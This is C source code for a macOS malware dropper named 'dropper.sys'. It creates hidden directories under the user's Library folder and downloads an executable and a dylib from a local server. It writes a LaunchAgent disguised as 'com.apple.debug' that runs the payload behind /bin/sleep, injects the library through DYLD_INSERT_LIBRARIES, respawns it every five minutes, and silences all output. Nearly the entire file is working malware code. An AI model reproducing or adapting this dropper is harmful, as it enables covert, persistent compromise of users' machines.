//
//  main.c
//  dropper.sys
//
//  Created by Nikola Tesla on 2/28/16.
//  Copyright © 2016 WireTech. All rights reserved.
//

#pragma GCC diagnostic ignored "-Wdeprecated-declarations"

#include <stdio.h>
#include <sys/stat.h>
#include <curl/curl.h>
#include <CoreFoundation/CoreFoundation.h>

#define INSTALL_PATH "Library/.debug/"
#define BIN_PATH INSTALL_PATH ".bin/"
#define RESOURCE_PATH INSTALL_PATH ".resources/"
#define PLUGINS_PATH INSTALL_PATH ".plugins/"
#define METASTASYS_EXECUTABLE BIN_PATH "debug-client"
#define CHAMELION_LIB BIN_PATH "libchamelion.sys.dylib"
#define LABEL "com.apple.debug"
#define PLIST_PATH "Library/LaunchAgents/" LABEL ".plist"
#define LOAD_COMMAND "/bin/launchctl load -w " PLIST_PATH
#define START_COMMAND "/bin/launchctl start " LABEL
#define PARASITE_HOST "/bin/sleep"
#define METASTASYS_DOWNLOAD "http://127.0.0.1:8080/downloads/metast.sys"
#define CHAMELION_DOWNLOAD "http://127.0.0.1:8080/downloads/libchamelion.sys.dylib"
#define METAST_DEBUG 1

void silence_output(int fdIn, int fdOut);
void create_launch_plist(void);
void load_launch_plist(void);
void create_folder_tree(void);
void download_components(void);

int main(int argc, const char * argv[]) {
    int fdIn, fdOut;
    if (!METAST_DEBUG) {
        fdOut = open("/dev/null", O_WRONLY);
        fdIn = open("/dev/null", O_RDONLY);
        silence_output(fdIn, fdOut);
    }
    chdir(getenv("HOME"));
    create_folder_tree();
    download_components();
    create_launch_plist();
    load_launch_plist();
    if (!METAST_DEBUG) {
        close(fdIn);
        close(fdOut);
    }
    return 0;
}

void silence_output(int fdIn, int fdOut) {
    dup2(fdIn, STDIN_FILENO);
    dup2(fdOut, STDOUT_FILENO);
    dup2(fdOut, STDERR_FILENO);
}

void create_folder_tree(void) {
    mkdir(INSTALL_PATH, 0777);
    mkdir(BIN_PATH, 0777);
    mkdir(RESOURCE_PATH, 0777);
    mkdir(PLUGINS_PATH, 0777);
}

ssize_t write_callback(void *buf, size_t buf_size, size_t nents, FILE *outfd) {
    return fwrite(buf, buf_size, nents, outfd);
}

void download_components(void) {
    CURL *curl;
    FILE *fp;
    if ((curl = curl_easy_init())) {
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_VERBOSE, METAST_DEBUG);
        if ((fp = fopen(METASTASYS_EXECUTABLE, "wb"))) {
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
            curl_easy_setopt(curl, CURLOPT_URL, METASTASYS_DOWNLOAD);
            curl_easy_perform(curl);
            fclose(fp);
            chmod(METASTASYS_EXECUTABLE, 0777);
        }
        if ((fp = fopen(CHAMELION_LIB, "wb"))) {
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
            curl_easy_setopt(curl, CURLOPT_URL, CHAMELION_DOWNLOAD);
            curl_easy_perform(curl);
            fclose(fp);
            chmod(CHAMELION_LIB, 0777);
        }
        curl_easy_cleanup(curl);
    }
}

char *get_plist_path(void) {
    char *home = getenv("HOME");
    size_t output_dir_size = strlen(home) + strlen(PLIST_PATH) + 2;
    char *output = NULL;
    if ((output = malloc(output_dir_size)) == NULL) {
        exit(EXIT_FAILURE);
    }
    memset(output, '\0', output_dir_size);
    strlcpy(output, home, output_dir_size);
    strlcat(output, "/", output_dir_size);
    strlcat(output, PLIST_PATH, output_dir_size);
    return output;
}

char *convert_bin_path(const char *bin) {
    char *bin_path = "/Library/.debug/.bin/";
    char *home = getenv("HOME");
    char *out = NULL;
    size_t out_size = strlen(home) + strlen(bin_path) + strlen(bin) + 1;
    if ((out = malloc(out_size)) == NULL) {
        return NULL;
    }
    strlcpy(out, home, out_size);
    strlcat(out, bin_path, out_size);
    strlcat(out, bin, out_size);
    return out;
}

void create_launch_plist(void) {
    char *output = get_plist_path();
    CFStringRef output_string = CFStringCreateWithCString(kCFAllocatorDefault, output, kCFStringEncodingASCII);
    CFURLRef output_url = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, output_string, kCFURLPOSIXPathStyle, false);
    CFRelease(output_string);
    free(output);
    CFStringRef arguments[3];
    arguments[0] = CFSTR(PARASITE_HOST);
    char *metastasys_executable = convert_bin_path("debug-client");
    CFStringRef metastasys_executable_str = CFStringCreateWithCString(kCFAllocatorDefault, metastasys_executable, kCFStringEncodingASCII);
    free(metastasys_executable);
    arguments[1] = metastasys_executable_str;
    arguments[2] = CFSTR("--zombie");
    CFArrayRef arguments_array = CFArrayCreate(kCFAllocatorDefault, (const void **)arguments, 3, &kCFTypeArrayCallBacks);
    CFMutableDictionaryRef mutable_env_dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    char *chamelion_lib = convert_bin_path("libchamelion.sys.dylib");
    CFStringRef chamelion_lib_str = CFStringCreateWithCString(kCFAllocatorDefault, chamelion_lib, kCFStringEncodingASCII);
    CFDictionarySetValue(mutable_env_dict, CFSTR("DYLD_INSERT_LIBRARIES"), chamelion_lib_str);
    free(chamelion_lib);
    CFRelease(chamelion_lib_str);
    CFDictionaryRef immutable_env_dict = CFDictionaryCreateCopy(kCFAllocatorDefault, mutable_env_dict);
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(dict, CFSTR("Label"), CFSTR(LABEL));
    CFDictionarySetValue(dict, CFSTR("KeepAlive"), kCFBooleanTrue);
    CFDictionarySetValue(dict, CFSTR("EnableGlobbing"), kCFBooleanTrue);
    CFDictionarySetValue(dict, CFSTR("ProgramArguments"), arguments_array);
    CFRelease(metastasys_executable_str);
    CFRelease(arguments_array);
    CFDictionarySetValue(dict, CFSTR("EnvironmentVariables"), immutable_env_dict);
    CFRelease(mutable_env_dict);
    CFRelease(immutable_env_dict);
    CFDictionarySetValue(dict, CFSTR("StandardOutPath"), CFSTR("/dev/null"));
    CFDictionarySetValue(dict, CFSTR("StandardErrorPath"), CFSTR("/dev/null"));
    int respawn = 300;
    CFNumberRef start_interval = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &respawn);
    CFDictionarySetValue(dict, CFSTR("StartInterval"), start_interval);
    CFRelease(start_interval);
    CFErrorRef data_error;
    CFDataRef xml_data = CFPropertyListCreateData(kCFAllocatorDefault, dict, kCFPropertyListXMLFormat_v1_0, 0, &data_error);
    SInt32 error_code;
    CFURLWriteDataAndPropertiesToResource(output_url, xml_data, NULL, &error_code);
    CFRelease(xml_data);
    CFRelease(dict);
    CFRelease(output_url);
}

void load_launch_plist(void) {
    system(LOAD_COMMAND);
    system(START_COMMAND);
}